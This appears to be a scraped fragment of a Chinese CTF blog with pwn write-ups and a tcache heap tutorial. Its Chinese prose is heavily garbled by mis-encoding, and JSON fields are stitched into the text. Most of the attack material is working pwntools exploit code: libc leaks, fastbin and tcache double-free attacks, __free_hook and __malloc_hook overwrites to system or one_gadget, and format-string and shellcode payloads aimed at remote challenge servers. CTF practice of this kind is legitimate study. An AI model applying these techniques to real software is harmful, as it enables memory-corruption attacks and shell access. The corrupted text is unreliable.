æ”»å‡»__free_hookæ¯”one_gadgetæ›´ç®€å• exp: from pwn import * from LibcSearcher import * #context.log_level = 'debug' local = 1 if local == 1: p = process('./ciscn_2019_es_1') else: p = remote('node3.buuoj.cn',25338) def add(size,name,num): p.sendlineafter('choice:','1') p.sendlineafter('Please input the size of compary\\'s name',str(size)) p.sendafter('please input name:',name) p.sendafter('please input compary call:',num) def show(index): p.sendlineafter('choice:','2') p.sendlineafter('Please input the index:',str(index)) def delete(index): p.sendlineafter('choice:','3') p.sendlineafter('Please input the index:',str(index)) ''' print(&quot;ç¬¬ä¸€ç§æ€è·¯ï¼šåˆ©ç”¨fastbin attack æ”»å‡»__malloc_hookå‡½æ•°ï¼Œå°šæœªæˆåŠŸ&quot;) print(&quot;========== step 1 : leak libc ============&quot;) add(0x410,'a','b') #0 add(0x10,'c','d') #1 delete(0) show(0) p.recvuntil('name:\\n') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 96 - 0x10 libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump(&quot;__malloc_hook&quot;) print(&quot;libc base : &quot; + hex(libc_base)) print(&quot;=========== step 2 : fastbin attack =========&quot;) add(0x60,'A','B') #3 delete(3) delete(3) add(0x60,p64(__malloc_hook-0x23),'hack') print(&quot;=========== step 3 : one_gadget =========&quot;) one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = libc_base + one_gadget_list[1] add(0x60,0x13 * b'A' + p64(one_gadget),'hhhh') #add(0x10,'a','b') pause() p.interactive() ''' print(&quot;ç¬¬äºŒç§æ€è·¯ï¼šåˆ©ç”¨unsorted biné€ƒé€¸å‡ºtcache binï¼Œç„¶åæ”»å‡»__free_hook&quot;) print(&quot;====================== step1 : leak libc =================&quot;) add(0x410,b'A' * 8,b'B') #0 add(0x10,b'/bin/sh\\00',b'D') #1 add(0x10,b'123',b'hack') #2 delete(0) show(0) p.recvuntil('name:\\n') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 96 -0x10 print(hex(__malloc_hook)) libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump('__malloc_hook') print(&quot;libc base:&quot; + hex(libc_base)) print(&quot;============ step2 : attack __free_hook function =================&quot;) print(&quot;__free_hook(chunk_mem) === system(binsh) &quot;) print(&quot;so we need change '__free_hook' to 'system' &quot;) __free_hook = libc_base + libc.dump(&quot;__free_hook&quot;) system_addr = libc_base + libc.dump(&quot;system&quot;) delete(2) delete(2) add(0x10,p64(__free_hook),b'lemon') #3 add(0x10,p64(system_addr),b'hack') #4 delete(2) p.interactive() ä¸´æ—¶åŠ ä¸ªæ”»é˜²ä¸–ç•Œï¼šstring è¿™ä¸ªé¢˜æ˜¯æœ‰ä¸ªå¸ˆå‚…é—®æˆ‘çš„ï¼Œå…¶å®åŸæ¥åšè¿‡äº†ï¼Œä½†æ˜¯å¥½ä¹…æ²¡æœ‰ç©è¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´äº†ï¼Œå°±é‡æ–°åšä¸€ä¸‹ æ”¶è·çš„å‡ ä¸ªç‚¹ï¼š 1ï¼Œæ³¨æ„mmapå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•° 2ï¼Œshellcode = asm(shellcraft.sh())èƒ½æ‰“é€šï¼Œå¦‚æœå†åŠ ä¸Šstr()å°±ä¸å¯ä»¥äº† exp: from pwn import * context.log_level = 'debug' local = 0 if local == 1: p = process('./dragon') else: p = remote('220.249.52.133',37799) p.recvuntil(&quot;secret[0] is &quot;) address = int(p.recvuntil(&quot;\\n&quot;),16) print(hex(address)) p.sendlineafter(&quot;What should your character's name be:\\n&quot;,'name') p.sendlineafter(&quot;So, where you will go?east or up?:\\n&quot;,'east') p.sendlineafter(&quot;go into there(1), or leave(0)?:\\n&quot;,'1') p.sendlineafter(&quot;'Give me an address'\\n&quot;,str(address)) print(&quot;ç»è¿‡æµ‹è¯•ï¼Œå‘ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ç¬¬7ä¸ªå‚æ•°&quot;) payload = fmtstr_payload(7,{address:85}) p.sendlineafter(&quot;And, you wish is:\\n&quot;,payload) print(&quot;ç»è¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€shellcodeäº†ï¼Œå› ä¸ºmmapçš„ç¬¬ä¸‰ä¸ªå‚æ•°&quot;) context(os = 'linux',arch = 'amd64') shellcode = asm(shellcraft.sh()) #shellcode = asm(shellcraft.amd64.linux.sh()) print(shellcode) #shellcode = &quot;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05&quot; p.recvuntil(&quot;Wizard: I will help you! USE YOU SPELL&quot;) p.sendline(shellcode) p.interactive() wustctf2020_closed å­¦åˆ°äº†ï¼ŒæŠ½ç©ºå¾—å­¦ä¹ ä¸‹IO_FILEçš„çŸ¥è¯† 0ï¼Œ1ï¼Œ2 åˆ†åˆ«å¯¹åº” stdin stdout stderr close(1) close(2)æ˜¯å…³é—­äº†å°†ç¨‹åºçš„è¾“å‡ºæ˜¾ç¤ºåˆ°å±å¹•ä¸Šï¼Œå¹¶ä¸”å…³é—­äº†æŠ¥é”™ä¿¡æ¯ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å…¶å®å·²ç»æ‹¿åˆ°äº†shellï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥é‡å®šå‘å°±å¥½ exec 1&gt;&amp;0 ä¸éœ€è¦exp ç›´æ¥ncå°±å¥½ hitcontraining_magicheap é€†å‘ mainå‡½æ•°ï¼Œå‘ç°æ¡†èµ·æ¥çš„åœ°æ–¹æœ‰äº›å¯ç–‘ ç‚¹å¼€å‡½æ•°ï¼Œå‘ç°æœ‰åé—¨ åˆ›å»ºå †å— ç¼–è¾‘å †å—ï¼Œå­˜åœ¨æ¼æ´ï¼Œå¯ä»¥è‡ªå®šä¹‰å †å—ç¼–è¾‘çš„å¤§å°ï¼ˆè€æ¼æ´äº† åˆ é™¤å †å—ï¼ŒğŸˆšï¸UAF å› ä¸ºæ²¡æœ‰showå‡½æ•°ä¹‹ç±»çš„ï¼Œæ‰€ä»¥å¾ˆéš¾æ³„æ¼ä¿¡æ¯ï¼Œæ­£å¥½ç¨‹åºæ²¡å¼€pieï¼Œå¹²è„†ç›´æ¥åˆ©ç”¨åé—¨ï¼Œæƒ³åŠæ³•åœ¨magicé™„è¿‘ä¼ªé€ chunk find_fake_fastæ°¸è¿œæ»´ç¥ï¼ï¼ exp ç¯å¢ƒå¯èƒ½å‡ºé—®é¢˜äº†ï¼ŒåŒæ ·çš„expæ‰“äº†åæ¬¡æ‰é€šï¼Œæœ¬åœ°æ˜¯é€šäº†ï¼Œè¿œç¨‹ä¹Ÿç»ˆäºé€šäº† from pwn import * context.log_level = 'debug' local = 0 if local == 1: p = process('./magicheap') else: p = remote('node3.buuoj.cn',25199) def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap:',content) def edit(index,size,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap:', content) def free(index): p.sendlineafter('Your choice :', '3') p.sendlineafter('Index :',str(index)) print(&quot;===== ç¬¬ä¸€ç§æ€è·¯ï¼š ä¸ç®¡åé—¨ï¼Œç›´æ¥fastbin attack æ‰“mallochook ======&quot;) print(&quot;======= ä½†æ˜¯æ²¡æœ‰showå‡½æ•°ï¼Œæˆ‘ä»¬æ— æ³•æ³„æ¼libc ======&quot;) print(&quot;æ‰€ä»¥ç»¼ä¸Šè€ƒè™‘ï¼Œè¦ä¸æˆ‘ä»¬è¿˜æ˜¯åˆ©ç”¨åé—¨å¥½äº†-.-||&quot;) ''' add(0x10,b'A' * 8) #chunk0 add(0x30,b'a' * 8) #chunk1 free(1) fake_chunk = 0x602062 payload = 0x10 * b'A' + p64(0) + p64(0x41) + p64(fake_chunk) print(&quot;payload length:&quot; + str(len(payload))) #print(p.recv()) #edit(0,41,payload) ''' print(&quot;double freeæä¸€ä¸‹&quot;) add(0x30,'A') #chunk0 add(0x60,'B') #chunk1 fake_chunk = 0x60207D free(1) payload = 0x30 * b'A' + p64(0) + p64(0x71) + p64(fake_chunk) print(&quot;è¿™é‡Œä¸çŸ¥é“å“ªé‡Œé”™äº†ï¼Œç¼–è¾‘åŠŸèƒ½æ€»æ˜¯ä¸Šä¸å»ï¼Œå¯èƒ½æ˜¯å‡½æ•°å†…éƒ¨ç¼–å†™çš„æœ‰é—®é¢˜ï¼Œæ‡’å¾—çœ‹äº†-.-&quot;) p.sendline('2') p.sendline('0') p.sendline(str(len(payload))) p.send(payload) #edit(0,len(payload),payload) add(0x60,p64(fake_chunk)) payload = 0x13 * b'A' + p64(0x1306) add(0x60,payload) p.interactive() ","link":"https://l3mon629.github.io/post/buu-pwn1/"},{"title":"[V&N2020 å…¬å¼€èµ›]easyTHeap","content":"ç”¨è¿™ä¸ªé¢˜æ¥æ€»ç»“ä¸€ä¸‹tcache attack å…³äºtcacheå‚è€ƒäº†è¿™ä¸ªå¸ˆå‚…çš„åšå®¢ï¼šhttps://www.jianshu.com/p/9778331e1337 tcache tcacheç»“æ„ä½“ Tcacheæœºåˆ¶æ˜¯åœ¨libc-2.26ä¸­å¼•å…¥çš„ä¸€ä¸ªæ–°çš„å †ç®¡ç†æœºåˆ¶ã€‚ é¦–å…ˆæ˜¯å¼•è¿›äº†ä¸¤ä¸ªç»“æ„ä½“ï¼Œtcache_perthread_structå’Œtcache_entry tcache_perthread_struct: #define TCACHE_MAX_BINS 64 typedef struct tcache_perthread_struct{ char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; }tcache_perthread_struct; tcache_entry: typedef struct tcache_entry{ struct tcache_entry *next; }tcache_entry; ç¬¬ä¸€ä¸ªç»“æ„ä½“ç”¨æ¥ç®¡ç†å †ï¼Œå¤§å°ä¸º0x240ï¼Œå¯ä»¥ç®¡ç†å¤§å°å°äº0x400çš„å †å—ï¼Œä¸ºå•¥å‘¢ï¼Ÿå†™ä¸ªç®€å•çš„å°demoå¤§å®¶å°±æ˜ç™½äº† #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *p,*q,*r,*s,*x; x = malloc(0x10); p = malloc(0x20); q = malloc(0x20); r = malloc(0x30); s = malloc(0x40); free(p); free(q); free(r); free(s); free(x); void *c1,*c2,*c3; c1 = malloc(0x50); c2 = malloc(0x60); c3 = malloc(0x70); free(c1); free(c2); free(c3); return 0; } ä¸Šé¢ç®€å•çš„ä¾‹å­ï¼Œå°±æ˜¯ç”³è¯·äº†ä»0x10-0x70å¤§å°çš„å †å—ï¼Œç„¶åæˆ‘ä»¬å…¨éƒ¨éƒ½freeæ‰ï¼Œç„¶ågdbè°ƒè¯•ä¸€ä¸‹ä¼šå‘ç°å¦‚ä¸‹ç»“æœ å¯ä»¥çœ‹åˆ°tcache_perthread_structç»“æ„ä½“æ˜¯ä»¥ä¸€ä¸ªå †çš„å½¢å¼å­˜åœ¨äºå †ç©ºé—´ä¸­ç®¡ç†è€…å †å—ï¼Œå…¶å¤§å°ä¸º 0x250ï¼Œç„¶åä¸è€ƒè™‘å…¶prevsizeå’Œsizeä½ï¼Œå‰0x40çš„ç©ºé—´ç®¡ç†ç€æ‰€æœ‰tcache binçš„ä¸ªæ•°ï¼ˆæœ€å¤§æ˜¯7ï¼‰ï¼Œä»0x10å¼€å§‹ï¼Œé‚£ä¹ˆå°±æ˜¯ 0x40 * 8 * 2 = 1024ï¼Œhex(1024) = 0x400ï¼Œæ‰€ä»¥å®ƒæœ€å¤§å¯å­˜åˆ°0x400çš„å †å—ã€‚ å¯¹æ¯”fastbin tcache binä¸fastbinæå…¶ç›¸ä¼¼ä½†æ˜¯åˆæœ‰æ‰€ä¸åŒ åŒï¼šç®¡ç†æ–¹å¼ä¸ºFILOçš„å•é“¾è¡¨å½¢å¼ï¼Œæ¯ä¸€ä¸ªbinsçš„inuseä½æ€»ä¸º1ï¼Œä¸æ‹…å¿ƒåˆå¹¶ å¼‚ï¼šfastbinçš„fdçš„æŒ‡é’ˆæŒ‡å‘chunk ptrï¼Œè€ŒtcacheæŒ‡å‘mem ptrã€‚tcacheä¸æ£€æŸ¥chunkçš„sizeæ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œä¹Ÿå°±æ˜¯è¯´æŒ‡å“ªæ‰“å“ªï¼Œä¸ç”¨è€ƒè™‘sizeä½äº†ï¼Œæ¯”å¦‚æ‰“__malloc_hookä¸ç”¨åˆ†é…åˆ°-0x23çš„ä½ç½®äº†ï¼Œæƒ³åˆ†é…åˆ°å“ªå°±åˆ†é…åˆ°å“ªã€‚tcacheä¸æ£€æŸ¥double freeã€‚tcacheä¼˜å…ˆçº§æœ€é«˜ã€‚ mallocå’Œfreeçš„è¿‡ç¨‹ mallocï¼š malloc(size)ï¼Œè‹¥sizeå°äº0x400ä¼šä¼˜å…ˆä»tcache binsé‡Œé¢å¯»æ‰¾ï¼Œè‹¥æ²¡æœ‰ï¼Œåˆ™å†ä»åˆ«çš„binsé‡Œé¢æ‰¾ã€‚ Tcachebinæœªæ»¡æ—¶ï¼Œå´ä»Fastbin/Smallbinä¸­å–å‡ºå †å—ï¼Œåˆ™ä¼šå°†é“¾ä¸Šçš„å…¶ä»–å †å—éƒ½é“¾å…¥Tcachebinä¸­ã€‚å…¶å…·ä½“ç®—æ³•æ˜¯é¦–å…ˆå°†Fastbin/Smallbinä¸­å–å‡ºçš„å †å—æŒ‡é’ˆè¿›è¡Œä¿å­˜ï¼Œå¹¶åˆ¤æ–­è¯¥å¤§å°å¯¹åº”çš„Tcachebinæ˜¯å¦æœªæ»¡ï¼Œè‹¥æœªæ»¡åˆ™å°†å…¶ä¹‹åçš„å †å—æŒ‰ç…§Fastbin/Smallbinçš„åˆ†é…é¡ºåºå°†å †å—é“¾å…¥Tcachebinä¸­ï¼Œç›´åˆ°å¯¹åº”å¤§å°çš„Tcachebinæ”¾æ»¡æˆ–Fastbin/Smallbinçš„é“¾ä¸ºç©ºï¼Œæœ€åå°†ä¹‹å‰å–å‡ºçš„å †å—æŒ‡é’ˆè¿”å›ç»™ç”¨æˆ·ä½¿ç”¨ã€‚ç”±äºæ˜¯æŒ‰ç…§Fastbin/Smallbinçš„åˆ†é…é¡ºåºå°†å †å—æ”¾å…¥Tcachebinä¸­ï¼Œå› æ­¤ä¸éš¾åˆ¤æ–­ï¼Œæœ€ä»Tcachebinä¸­ç”³è¯·çš„å †å—é¡ºåºæ˜¯ä¸æ­£å¸¸ä»Fastbin/Smallbinä¸­ç”³è¯·å †å—é¡ºåºæ—¶åå‘çš„ã€‚ æ–‡å­—çœ‹ä¸æ‡‚ï¼ˆæˆ‘ä¹Ÿæ²¡çœ‹æ‡‚ orzï¼‰ï¼Ÿæ²¡å…³ç³»ï¼Œä¸Šä»£ç ã€‚ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *c1,*c2,*c3,*c4,*c5,*c6,*c7,*f1,*f2,*f3; c1 = malloc(0x10); c2 = malloc(0x10); c3 = malloc(0x10); c4 = malloc(0x10); c5 = malloc(0x10); c6 = malloc(0x10); c7 = malloc(0x10); f1 = malloc(0x10); f2 = malloc(0x10); f3 = malloc(0x10); free(c1); free(c2); free(c3); free(c4); free(c5); free(c6); free(c7); free(f1); free(f2); free(f3); return 0; } æ²¡é”™ï¼Œç”³è¯·äº†åä¸ªç›¸åŒå¤§å°çš„chunkï¼Œç„¶åå…¨éƒ¨freeæ‰ï¼Œå…¶ä¸­cå¼€å¤´çš„æ˜¯æ”¾åˆ°tcache binsä¸­çš„ï¼Œfå¼€å¤´çš„æ˜¯tcacheæ»¡äº†ç„¶åè¢«æ”¾åˆ°äº†fastbinsé‡Œé¢ä¸­å»ã€‚ çœ‹ä¸€ä¸‹å†…å­˜åˆ†å¸ƒ ç„¶åæˆ‘ä»¬æ”¹ä¸€ä¸‹æºç  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *c1,*c2,*c3,*c4,*c5,*c6,*c7,*f1,*f2,*f3; c1 = malloc(0x10); c2 = malloc(0x10); c3 = malloc(0x10); c4 = malloc(0x10); c5 = malloc(0x10); c6 = malloc(0x10); c7 = malloc(0x10); f1 = malloc(0x10); f2 = malloc(0x10); f3 = malloc(0x10); free(c1); free(c2); free(c3); free(c4); free(c5); free(c6); free(c7); free(f1); free(f2); free(f3); void *t1,*t2,*t3,*t4,*t5,*t6,*t7; void *a1,*a2,*a3; t1 = malloc(0x10); t2 = malloc(0x10); t3 = malloc(0x10); t4 = malloc(0x10); t5 = malloc(0x10); t6 = malloc(0x10); t7 = malloc(0x10); a1 = malloc(0x10); return 0; } æ€è·¯å°±æ˜¯æˆ‘ä»¬å°†tcachebinå¡«æ»¡ï¼Œç„¶åfree3æ¬¡åŒæ ·å¤§å°çš„chunkï¼Œå‘ç°è¿›å…¥åˆ°fastbiné‡Œé¢ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡mallocå°†tcachebinå…¨éƒ¨æ¸…ç©ºï¼Œå¦‚ä¸‹å›¾ å¯ä»¥çœ‹åˆ°æ­¤æ—¶tcachebinå·²ç»ç©ºäº† fastbiné‡Œé¢æ˜¯è¿™æ ·çš„ ç„¶åå†mallocä¸€æ¬¡ï¼Œå‘ç°fastbinè¢«æ¸…ç©ºï¼Œå‰©ä½™çš„ä¸¤ä¸ªbinè¢«ç§»åˆ°tcachebiné‡Œé¢å» æœ¬æ¥æ˜¯350æŒ‡å‘330 ç§»å…¥åˆ°tcacheåå˜æˆäº†340(0x350 - 0x10)æŒ‡å‘äº†360 è¯æ˜äº†å‰æ–‡çš„ç»“è®ºï¼Œâ€œå› æ­¤ä¸éš¾åˆ¤æ–­ï¼Œæœ€ä»Tcachebinä¸­ç”³è¯·çš„å †å—é¡ºåºæ˜¯ä¸æ­£å¸¸ä»Fastbin/Smallbinä¸­ç”³è¯·å †å—é¡ºåºæ—¶åå‘çš„â€ã€‚ åˆ©ç”¨æ–¹æ³• è´´ä¸ªå¤§ä½¬æ€»ç»“çš„ï¼Œæˆ‘ä»”ç»†çœ‹äº†çœ‹è¿™å‡ ä¸ªæ–¹æ³•çš„è¯´æ˜ï¼Œæœ¬é¢˜ç›®åº”è¯¥ç”¨äº†ä»¥ä¸‹å‰ä¸‰ä¸ªæ¼æ´ï¼Œå…¶å®å«å•¥åä¸é‡è¦ï¼Œä¼šç”¨å°±è¡Œ~ Tcache poisoningï¼ˆtcache æŠ•æ¯’ï¼‰ åœ¨ä¸Šä¸€éƒ¨åˆ†ä¸­ä¹Ÿæåˆ°è¿‡è¿™ç§æ–¹æ³•ã€‚ä¸Fastbin Attackç±»ä¼¼ï¼Œç¯¡æ”¹Tcachebinä¸­çš„fdå­—æ®µï¼Œå¯¼è‡´åœ¨ç”³è¯·è¢«ç¯¡æ”¹å †å—åçš„ä¸‹ä¸€ä¸ªå †å—æ—¶èƒ½å¤Ÿç”³è¯·åˆ°ä»»æ„åœ°å€ã€‚ä¸Fastbinç›¸æ¯”ï¼ŒTcachebinä¸­ä¸ºäº†å¾—åˆ°æ›´é«˜çš„æ•ˆç‡è€Œèˆå»äº†å®‰å…¨æ€§ï¼Œåœ¨è¿›è¡Œç”³è¯·æ—¶æ²¡æœ‰å¯¹sizeä½è¿›è¡Œæ ¡éªŒï¼Œè€Œä¸”ç”±äºTcachebinä¸­çš„fdæ˜¯æŒ‡å‘ä¸‹ä¸€ä¸ªå †å—çš„fd(Fastbinçš„fdæ˜¯æŒ‡å‘ä¸‹ä¸€ä¸ªå †å—çš„å †å¤´)ï¼Œå› æ­¤æŒ‡å‘çš„åœ°å€å³æ˜¯ç”³è¯·åå†™æ•°æ®çš„åœ°å€ï¼Œä¸å†éœ€è¦å»è€ƒè™‘å †å¤´çš„åç§»ã€‚ Tcache dupï¼ˆï¼Ÿï¼Ÿï¼Ÿï¼‰ è¿™æ˜¯Tcacheæœºåˆ¶åˆšæ¨å‡ºçš„å‡ ä¸ªç‰ˆæœ¬ä¸­ï¼Œåœ¨è¿›è¡Œfreeæ“ä½œæ—¶æ²¡æœ‰å¯¹è¿™ä¸ªå †å—è¿›è¡Œä¸€ä¸ªå®‰å…¨æ£€æµ‹è€Œå¯¼è‡´å¯ä»¥å¯¹åŒä¸€ä¸ªå †å—è¿›è¡Œå¤šæ¬¡freeï¼Œé‚£ä¹ˆå°±ä¼šå˜æˆä¸€ä¸ªTcachebiné“¾ä¸Šé“¾äº†ä¸¤ä¸ªç›¸åŒçš„å †å—(æˆ‘æŒ‡å‘æˆ‘è‡ªå·±)ï¼Œåé¢ä¹Ÿå°±ä¸ç”¨å¤šè¯´äº†ã€‚ä½†å€¼å¾—ä¸€æçš„æ˜¯åœ¨libc-2.29ç‰ˆæœ¬ä¸­åŠ å…¥äº†æ£€æŸ¥æœºåˆ¶(æºç çš„4201-4216è¡Œ)ï¼Œä¼šåœ¨å †å—è¿›è¡Œfreeæ—¶æ£€æŸ¥è¿™ä¸ªå †å—æ˜¯å¦å·²ç»å­˜åœ¨äºè¿™æ¡é“¾ä¸Šï¼Œå¦‚æœå­˜åœ¨åˆ™ä¼šæŠ¥&quot;free():double free detected in tcache 2&quot;çš„é”™è¯¯ï¼Œå› æ­¤è¿™ç§ç›´æ¥double freeåˆ©ç”¨æ–¹å¼å­˜åœ¨äºlibc-2.26è‡³libc-2.28çš„ç‰ˆæœ¬ä¸­ã€‚ Tcache perthread corruption ï¼ˆç»“æ„ä½“æ±¡æŸ“ï¼‰ åœ¨æœ€å¼€å§‹ä»‹ç»ç»“æ„ä½“æ—¶æåˆ°çš„tcache_perthread_structç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“sizeä¸º0x250ï¼Œæ˜¯ç®¡ç†æ•´ä¸ªTcachebinçš„ç»“æ„ä½“ï¼Œå¦‚æœå¯¹è¿™ä¸ªç»“æ„ä½“æœ‰å†™æƒé™ï¼Œé‚£ä¹ˆå¯ä»¥æ§åˆ¶ä»»æ„å¤§å°Tcachebinçš„å…¥å£åœ°å€ã€‚ U2Tï¼ˆç¿»è¯‘å›æ­»äº†ï¼‰ U2Tå³Unsortbin 2 Tcachebinï¼Œè¿™ç§å«æ³•æ˜¯åœ¨ä¸€ç¯‡æ–‡ç« ä¸­çœ‹åˆ°çš„ï¼Œä¹Ÿåªçœ‹åˆ°è¿‡ä¸€æ¬¡ï¼Œä¸»è¦æ˜¯é…åˆOff By Oneæˆ–Off By NULLçš„æ¼æ´ï¼Œä½¿Unsortbinåœ¨åˆå¹¶è¿‡ç¨‹ä¸­å°†ä¸­é—´çš„Tcachebinåˆå¹¶ï¼Œä»è€Œè¾¾åˆ°ä¿®æ”¹fdå­—æ®µçš„æ•ˆæœã€‚ é¢˜ç›® é€†å‘ ç¨å¾®é€†ä¸€ä¸‹å°±å‘ç°äº†deleteçš„æ—¶å€™å­˜åœ¨UAFæ¼æ´ ä¸è¿‡å¿…é¡»è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åªèƒ½malloc 7æ¬¡ï¼Œfree 3æ¬¡ pwn it !!! è¿™é“é¢˜ä¿æŠ¤å…¨å¼€ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ”»å‡»__malloc_hook æ€è·¯ï¼š 1ï¼Œæ”»å‡»__malloc_hookï¼Œå¿…é¡»è¦ä¼ªé€ chunkï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨tcacheçš„ç‰¹ç‚¹ï¼Œåˆ©ç”¨ç»“æ„ä½“æ±¡æŸ“ï¼Œå°†tcache_perthread_structçš„æŒ‡é’ˆåŸŸæ”¹ä¸º__malloc_hooké™„è¿‘ 2ï¼Œæ±¡æŸ“ç»“æ„ä½“ï¼Œå¿…é¡»è¦èƒ½åˆ†é…åˆ°ç»“æ„ä½“ä¸Šï¼Œæˆ‘ä»¬å¯é€‰æ‹©double freeï¼Œä½†æ˜¯å‰æå¿…é¡»è¦çŸ¥é“ç»“æ„ä½“çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨showæ¥æ³„æ¼åœ°å€ï¼Œmalloc(size),free(),free()ï¼Œè¿™æ ·è¯¥chunkå°±è®°å½•äº†è‡ªå·±çš„åœ°å€ï¼Œå‡å»0x250å°±æ˜¯ç»“æ„ä½“çš„åœ°å€ 3ï¼Œæ‰“one_gadgetï¼Œå¿…é¡»è¦çŸ¥é“libcåŸºåœ°å€ï¼Œæˆ‘ä»¬åˆ©ç”¨freeæ€çš„ç»“æ„ä½“å †å—ï¼ˆ0x250ä¼šè¿›å…¥unsorted binï¼‰ï¼Œæ³„æ¼main_arenaä¸Šæ–¹çš„__malloc_hookæ‹¿åˆ°åŸºåœ°å€ ä¸€ç§æ–¹æ³• å””â€¦â€¦ï¼Œæœ¬åœ°åªæœ‰2.28ç‰ˆæœ¬çš„libcï¼Œæ‰€ä»¥æœ¬åœ°ä¸å¯èƒ½æ‰“é€šï¼Œç®€å•å†™äº†ä¸€ä¸‹ï¼Œç„¶åone_gadgetå’Œæœ€åreallocè°ƒæ ˆæ¡¢çš„æ—¶å€™éƒ½æ˜¯æŠ„çš„åˆ«çš„å¸ˆå‚…çš„åç§»orz exp: from pwn import * ''' author : lemon libc_version: 2.27 ''' libc = ELF('./libc-2.27.so') local = 0 if local == 1: p = process('./vn_pwn_easyTHeap') else: p = remote('node3.buuoj.cn',26169) def dbg(): gdb.attach(p) def add(size): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) def edit(index,content): p.sendafter('choice: ','2') p.recvuntil('idx?') p.sendline(str(index)) p.recvuntil('content:') p.send(content) def show(index): p.sendafter('choice: ','3') p.recvuntil('idx?') p.sendline(str(index)) def free(index): p.sendafter('choice: ','4') p.recvuntil('idx?') p.sendline(str(index)) print(&quot;================ step1:é€ƒé€¸tcache ==============&quot;) print(&quot;-------- åˆ©ç”¨double freeï¼Œå°†fd ptr å†™åˆ° tcacheå¤„ -------&quot;) add(0x50) #0 free(0) free(0) add(0x50) #1 show(1) leak_tcache = u64(p.recv(6) + b'\\00\\00') - 0x250 print(&quot;tcache is in :&quot; + hex(leak_tcache)) edit(1,p64(leak_tcache)) print('----- æ”¹å†™tcahcheç»“æ„ä½“ä¸­å †å—çš„æ•°é‡ï¼Œä½¿ä»¥åçš„chunkå¯ä»¥ä¸è¿›å…¥tcache -----') add(0x50) #2 add(0x50) #3 this is tcache_perthread_struct ä½†æ˜¯è¿™é‡Œçš„sizeä»ç„¶æ˜¯0x251 edit(3,b'a' * 0x30) print('================= step2:æ³„æ¼libc ==============') print('----- åˆ©ç”¨3å·å †å—ï¼ˆtcacheç»“æ„ä½“å †å—ï¼‰ï¼Œé‡Šæ”¾åè¿›å…¥unsorted binä¸­ï¼Œæ³„æ¼libc -----') free(3) show(3) leak_libc = u64(p.recv(6) + b'\\00\\00') - 96 - 0x10 - libc.symbols['__malloc_hook'] #libc: 2.27 leak the address is 'main_arena + 96' print('the libcbase is :'+hex(leak_libc)) print('----- è·å¾—ä¸€äº›å‡½æ•°å’Œone gadgetçš„åœ°å€ ------') #one_gadget = [0x41982,0x419d6,0xdf882] one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = leak_libc + one_gadget_list[1] malloc_hook = leak_libc + libc.symbols['__malloc_hook'] realloc_hook = leak_libc + libc.symbols['realloc'] print(&quot;================== step3: æ”»å‡» __malloc_hook ============&quot;) add(0x50) #4 edit(4, p64(0) * 9 + p64(malloc_hook - 0x13)) add(0x20) # fake chunk paylaod = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook + 8) edit(5, paylaod) add(0x20) p.interactive() å¦ä¸€ç§æ–¹æ³• ï¼ˆä¼¼ä¹è¿˜æœ‰åˆ«çš„æ–¹æ³•ï¼Œæˆ‘å†æƒ³æƒ³è¿˜èƒ½ä¸èƒ½ç”¨åˆ«çš„æ–¹æ³•åšå‡ºæ¥ï¼ˆé€ƒ ï¼‰ å¥½åƒåˆæ‰¾åˆ°äº†ä¸€ç§æ„é€ æ–¹å¼ï¼Œæœ¬è´¨æ€è·¯æ²¡æœ‰å˜ï¼Œç»†èŠ‚ç¨å¾®æ”¹åŠ¨äº†ä¸€ä¸‹ï¼Œæ¯”å¦‚æ³„æ¼libcæ¢æˆäº†0å·chunkï¼ˆå“ˆå“ˆå“ˆ from pwn import * ''' author : lemon libc_version: 2.27 ''' libc = ELF('./libc-2.27.so') local = 0 if local == 1: p = process('./vn_pwn_easyTHeap') else: p = remote('node3.buuoj.cn',27567) def dbg(): gdb.attach(p) def add(size): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) def edit(index,content): p.sendafter('choice: ','2') p.recvuntil('idx?') p.sendline(str(index)) p.recvuntil('content:') p.send(content) def show(index): p.sendafter('choice: ','3') p.recvuntil('idx?') p.sendline(str(index)) def free(index): p.sendafter('choice: ','4') p.recvuntil('idx?') p.sendline(str(index)) print(&quot;============ step 1: é€ƒé€¸tcache bin ===========&quot;) add(0x100) #0 add(0x10) #1 protect 0 free(0) free(0) show(0) tcache_perthread_struct = u64(p.recv(6).ljust(8,b'\\00')) - 0x250 add(0x100) #2 (0) edit(2,p64(tcache_perthread_struct)) add(0x100) #3 add(0x100) #4 